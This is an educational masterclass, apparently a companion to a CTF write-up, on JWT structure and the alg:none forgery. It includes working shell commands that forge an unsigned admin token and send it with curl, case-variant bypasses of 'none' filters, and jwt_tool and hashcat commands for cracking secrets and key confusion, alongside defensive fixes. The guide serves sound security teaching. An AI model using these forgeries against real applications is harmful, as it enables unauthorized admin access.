# Masterclass: JWTs and the `alg:none` Forgery, Explained From Zero

**Companion to:** `jwt-alg-none-writeup.md`

The box itself was easy, but *why* it's easy, and the family of JWT attacks around it, is worth knowing cold. This guide explains what a JWT is, how signing is *supposed* to protect it, exactly why `alg:none` breaks that, how to forge tokens by hand and with tools, and the other JWT attacks you'll meet (key confusion, weak secrets, `kid` injection). From zero.

---

## How to read this

- **Part 0**, tokens vs. sessions: why a `role` was in the cookie at all.
- **Part 1**, JWT anatomy (header, payload, signature).
- **Part 2**, how signatures *should* protect a token.
- **Part 3**, the `alg:none` bug, precisely.
- **Part 4**, forging by hand (and with `jwt_tool`).
- **Part 5**, the wider JWT attack family.
- **Part 6**, the real fixes.
- **Glossary**.

---

# PART 0, Why Was a Role Sitting in a Cookie?

Two ways a web app remembers "who you are" after login:

- **Server-side sessions:** the server stores your identity/role in its own memory/DB and gives you a meaningless random **session ID**. You can't tamper with your role, it's not in your hands. (This is the AFTERHOURS/ROSTER style.)
- **Stateless tokens (JWT):** the server puts your identity/role **into a token it hands you**, and relies on a **cryptographic signature** to detect tampering. Nothing is stored server-side; the token *is* the state.

The JWT approach is popular because it scales (no server-side session store). But it has a hard requirement: **the server must verify the signature on every request.** If it doesn't, the client is holding, and can edit, its own authorization. That's this whole box: `role:"user"` lived in the token, and the server forgot to verify it.

**Red flag to internalise:** when you see your **role/privilege inside a cookie or token**, your first move is *decode it*, because if you can read it, you might be able to rewrite it.

---

# PART 1, JWT Anatomy

A JWT is three **base64url** chunks joined by literal dots, **`header.payload.signature`**, with **no spaces** anywhere. The dots are the only separators; here the signature is empty (`alg:none`), so the token *ends* in a dot. Colour-coded with the jwt.io convention:

<pre style="white-space:pre-wrap;word-break:break-all;line-height:1.5"><span style="color:#e5484d;font-weight:700">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</span><span style="font-weight:700">.</span><span style="color:#d6409f;font-weight:700">eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJ1c2VyIn0</span><span style="font-weight:700">.</span><span style="color:#4c8dff;font-weight:700">⟨empty signature⟩</span></pre>

<span style="color:#e5484d;font-weight:700">■ header</span> &nbsp;·&nbsp; <span style="color:#d6409f;font-weight:700">■ payload</span> &nbsp;·&nbsp; <span style="color:#4c8dff;font-weight:700">■ signature</span>

(If your Markdown viewer strips HTML/colour, the three parts are still just the text between the dots: `header` `.` `payload` `.` `signature`.)

### 1.1 Header, *how* the token is secured
```json
{"alg":"none","typ":"JWT"}
```
`alg` names the signing algorithm (e.g. `HS256`, `RS256`, or `none`). `typ` is just "JWT".

### 1.2 Payload, the **claims** (the data)
```json
{"username":"bob","role":"user"}
```
Arbitrary JSON the app cares about. **Not encrypted, only encoded.** Anyone can read it. (So never put secrets in a JWT payload.)

### 1.3 Signature, the tamper-seal
Normally a cryptographic value over `header.payload` using a secret/key. It's what lets the server detect edits. With `alg:none`, this part is **empty**, there's your trailing dot.

### 1.4 base64url (not plain base64)
JWTs use **base64url**: `+`→`-`, `/`→`_`, and padding `=` stripped. To decode by hand you reverse that and re-pad:
```bash
b64url_d(){ s="${1//-/+}"; s="${s//_//}"; p=$((${#s}%4)); [ $p -ne 0 ] && s="$s$(printf '=%.0s' $(seq $((4-p))))"; echo "$s"|base64 -d; }
b64url_d eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0   # → {"alg":"none","typ":"JWT"}
```
Encoding (for forging):
```bash
b64url(){ base64 -w0 | tr '+/' '-_' | tr -d '='; }
```

---

# PART 2, How a Signature Is *Supposed* to Protect You

Take `HS256` (HMAC-SHA256, a **symmetric** scheme): the server computes
```
signature = HMAC_SHA256( base64url(header) + "." + base64url(payload), SECRET_KEY )
```
On each request it **recomputes** that HMAC with its own `SECRET_KEY` and compares. If you change `role:user`→`role:admin`, the HMAC no longer matches (you don't know `SECRET_KEY`), so the server rejects the token. That's the deal: **you can read the payload, but you can't forge a valid signature without the key.**

`RS256` is the **asymmetric** variant: signed with the server's *private* key, verified with its *public* key, same guarantee, different key model (remember this for Part 5's key-confusion attack).

---

# PART 3, The `alg:none` Bug, Precisely

The JWT spec includes `"alg":"none"`, an **"unsecured JWT"** with *no signature at all*. It exists for niche cases where integrity is guaranteed by other means. The spec and every sane library say a verifier must **only** accept `none` if it was explicitly configured to, otherwise **reject it**.

The vulnerability: a server that **reads `alg` from the attacker's token and does what it says.** If the token claims `alg:none`, a buggy verifier concludes "no signature needed" and trusts the payload verbatim. Since *you* write the header, you just declare `alg:none` and the signature check evaporates.

So the trust model inverts: instead of "the server's secret decides what's valid," it becomes "**the attacker's header decides what's valid.**" Game over for authorization.

ROSTER HQ's cousin here literally shipped `alg:none` by default, so we didn't even have to downgrade from `HS256`, the token was already unsigned.

---

# PART 4, Forging the Token

### 4.1 By hand (what the writeup did)
Three moves: keep/set `alg:none`, edit the payload, leave the signature empty.
```bash
b64url(){ base64 -w0 | tr '+/' '-_' | tr -d '='; }
H=$(printf '{"alg":"none","typ":"JWT"}'        | b64url)
P=$(printf '{"username":"bob","role":"admin"}' | b64url)
TOKEN="$H.$P."          # trailing dot = empty signature
curl -s -b "auth=$TOKEN" http://TARGET/admin
```
Why the trailing dot matters: the token must still be *shaped* like a JWT (`header.payload.signature`). The signature is empty, but the **second dot has to be there** or many parsers reject the format.

### 4.2 Casing bypasses (keep these in your pocket)
Some servers blocklist the literal `"none"` but compare case-sensitively. If `none` is filtered, try:
```
"alg":"None"   "alg":"NONE"   "alg":"nOnE"
```
A correct implementation normalises/rejects all of these; a sloppy blocklist misses them.

### 4.3 With `jwt_tool` (the standard tool)
```bash
jwt_tool <token>                 # decode + inspect
jwt_tool <token> -X a            # auto-forge the alg:none exploit token
jwt_tool <token> -T              # tamper mode: interactively edit claims
```
`-X a` builds the `none` variants for you. (Other `-X` modes cover the attacks in Part 5.)

### 4.4 Confirm the gate first, then forge
Good discipline: hit the protected route with the **original** token to see the "denied" response (`{"error":"not admin"}`), *then* with the forged one, so the diff proves the forgery did the work.

---

# PART 5, The Wider JWT Attack Family

`alg:none` is the easiest, but when it's patched, these are the next doors. Recognising which applies comes from reading the **header's `alg`** and the app's behaviour.

| Attack | When it applies | Idea |
|---|---|---|
| **`alg:none`** | header allows `none` | Strip the signature; server trusts payload. *(This box.)* |
| **Weak HMAC secret** | `alg:HS256` | The secret is guessable, crack it offline, then sign valid tokens. `hashcat -m 16500 <jwt> rockyou.txt` or `jwt_tool -C -d wordlist`. |
| **Key confusion (RS256→HS256)** | server verifies `RS256`, and its **public** key is obtainable | Change `alg` to `HS256` and sign with the *public key as the HMAC secret*. A naive library uses the same "key" param for both, so it HMACs with the public key, which you have. |
| **`kid` injection** | header has a `kid` (key ID) used to fetch the key | `kid` is sometimes used in a file path or SQL lookup → path traversal / SQLi → point it at a key you control (e.g. `/dev/null` → empty key). |
| **`jku`/`x5u` abuse** | header references a URL for the key set | Point it at *your* server hosting a key you signed with. |

The meta-skill: **decode the header, read `alg`, and pick the matching attack.** Weak-secret cracking (HS256) and key-confusion (RS256) are the two you'll use most after `none`.

---

# PART 6, The Real Fixes

- **Pin the algorithm server-side and reject `none`:**
  ```js
  jwt.verify(token, SECRET, { algorithms: ['HS256'] });   // never accept 'none'
  ```
  Never read `alg` from the token to decide how to verify, the verifier dictates the algorithm, not the attacker.
- **Use a strong, secret key** (long, random) for HS256; use proper key management for RS256 and don't reuse the public key as an HMAC secret.
- **Verify the signature on every request**, and check standard claims (`exp` expiry, `iss`, `aud`).
- **Don't trust authorization data you can't verify.** Minimise sensitive claims; where possible keep authz state server-side. And remember the payload is only *encoded*, never put secrets in it.

---

# Glossary

- **base64url**, base64 with `-`/`_` instead of `+`/`/` and no `=` padding; the encoding JWTs use.
- **Claim**, a field in the JWT payload (`role`, `username`, `exp`).
- **HMAC / HS256**, symmetric signing: one shared `SECRET_KEY` both signs and verifies.
- **JWS / JWT**, JSON Web Signature / Token; the signed-token format (RFC 7515 / 7519).
- **`kid`**, "key ID" header field naming which key to use; sometimes injectable.
- **Key confusion**, tricking an `RS256` verifier into `HS256` so you sign with the public key.
- **`alg:none`**, the "unsecured JWT" algorithm (no signature); must be rejected unless explicitly allowed.
- **RS256**, asymmetric signing: private key signs, public key verifies.
- **Signature**, the cryptographic seal over `header.payload`; empty under `alg:none`.
- **Stateless auth**, identity/role carried in a client token rather than a server session.

---

# Where to Go Next

- Get **`jwt_tool`** and practise `-X a` (none), `-C` (crack secret), `-X k` (key confusion) against a deliberately-vulnerable JWT app.
- Read **RFC 7519 / 7515** on why `none` must be rejected, and the **OWASP JWT** guidance.
- Build a tiny Express app with `jwt.verify(token, key)` *without* an `algorithms` allow-list, forge a `none` token against it, then add `{algorithms:['HS256']}` and watch the forgery die, and try cracking a weak `HS256` secret with hashcat `-m 16500`.

The transferable idea: **a token you hold is only trustworthy if the server verifies it.** Decode every token that carries a role, half the time the header tells you exactly how to forge it.
